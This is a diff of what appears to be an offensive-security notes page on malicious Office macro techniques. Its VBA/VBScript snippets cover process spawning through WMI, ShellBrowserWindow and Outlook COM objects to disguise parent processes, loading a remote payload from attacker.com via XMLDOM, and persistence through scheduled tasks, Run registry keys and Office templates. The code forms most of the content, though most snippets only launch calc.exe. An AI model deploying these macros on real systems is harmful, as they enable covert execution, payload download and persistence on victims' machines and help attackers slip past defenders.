@@ -4,14 +4,14 @@ Looking at the Parent/Child processes is a good indicator of malicious activity,
 
 ## <mark style="color:red;">WMI</mark> <a href="#wmi" id="wmi"></a>
 
-```
+```vba
 Sub MyMacro()
     Arg = "cmd /k calc.exe"
     GetObject("winmgmts:").Get("Win32_Process").Create Arg, Null, Null, pid
 End Sub
 ```
 
-```
+```vba
 // Some codeSet objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
 Set objConfig = objStartup.SpawnInstance_
@@ -23,7 +23,7 @@ This will make your process be spawned under "wmiprvse.exe."
 
 ## <mark style="color:red;">ShellBrowserWindow</mark> <a href="#shellbrowserwindow" id="shellbrowserwindow"></a>
 
-```
+```powershell
 Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
 obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
 ```
@@ -32,17 +32,17 @@ This will make your process spawn from under "explorer.exe"
 
 ## <mark style="color:red;">XMLDOM</mark> <a href="#xmldom" id="xmldom"></a>
 
-```
+```vba
 Set xml = CreateObject("Microsoft.XMLDOM")
 xml.async = False
 Set xsl = xml
-xsl.load(“http://attacker.com/payload.xsl”)
+xsl.load("http://attacker.com/payload.xsl")
 xml.transformNode xsl
 ```
 
 ## <mark style="color:red;">Scheduled Tasks</mark> <a href="#3e76" id="3e76"></a>
 
-```
+```vba
 Set service = CreateObject("Schedule.Service")
 Call service.Connect
 Dim td: Set td = service.NewTask(0)
@@ -66,14 +66,14 @@ We can modify the registry which can serve as persistence and a way of executing
 
 #### WMI:
 
-```
+```vba
 Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
 objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "key1", "value1"
 ```
 
 #### Wscript:
 
-```
+```vba
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\key2", "value2", "REG_SZ
 ```
@@ -94,7 +94,7 @@ Injecting our shellcode to a remote process can make our payload live in another
 
 ## <mark style="color:red;">Template persistence</mark>
 
-```
+```vba
 Set objShell = CreateObject("Wscript.Shell")
 appDataLocation = objShell.ExpandEnvironmentStrings("%APPDATA%")
 Path = appDataLocation & "\Microsoft\Templates"
@@ -106,7 +106,7 @@ objFile.Close
 
 ## <mark style="color:red;">Outlook</mark> <a href="#outlook" id="outlook"></a>
 
-```
+```vba
 Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
 obj.CreateObject("WScript.Shell").Run ("calc.exe")
 ```
